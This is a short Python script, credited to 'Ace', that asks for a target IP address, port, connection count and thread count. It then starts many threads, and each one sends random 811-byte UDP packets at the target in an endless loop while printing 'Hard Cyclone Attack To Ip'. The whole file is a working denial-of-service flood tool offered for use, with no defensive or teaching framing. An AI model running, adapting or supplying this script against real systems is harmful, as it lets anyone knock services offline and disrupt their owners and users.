import random
import socket
import threading
import os, sys, time

os.system("clear")
print(">> Code By Ace <<")
print(" ")
ip = str(input(">> Ip Target :"))
time.sleep(1)
port = int(input(">> Port Target :"))
time.sleep(1)
times = int(input(">> Connection :"))
time.sleep(1)
threads = int(input(">> Threads :"))

def hc():
       data = random._urandom(811)
       while True:
               try:
                    s = socket._socket(socket.AF_INET, socket.SOCK_DGRAM)
                    addr = (str(ip),int(port))
                    for x in range(times):
                            s.sendto(data,addr)
                    print("! Hard Cyclone Attack To Ip !")
               except:
                    print("! WARNING !")

for y in range(threads):
               th = threading.Thread(target = hc)
               th.start()